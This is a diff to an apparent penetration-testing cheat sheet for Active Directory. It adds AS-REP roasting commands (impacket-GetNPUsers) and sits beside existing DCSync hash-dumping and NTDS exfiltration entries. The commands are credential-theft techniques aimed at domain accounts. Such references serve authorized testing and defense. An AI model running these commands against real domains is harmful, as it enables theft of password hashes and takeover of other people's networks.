@@ -141,6 +141,17 @@ DCSync exploit :
 impacket-secretsdump -just-dc-ntlm <domain>/<user>:<password>@<ipaddress>
 ```
 
+### AS-REP Roasting
+Look for users without Kerberos pre-authentication required attribute (using credential) :
+```markdown
+impacket-GetNPUsers -dc-ip <IP-DC> domain/username:password
+```
+
+Get a TGT for a user, whithout his password, if you know that this account have Kerberos pre-auth disabled :
+```markdown
+impacket-GetNPUsers -dc-ip <IP-DC> domain/username -no-pass
+```
+
 ### NTDS Exfiltration
 
 Dump NTDS :
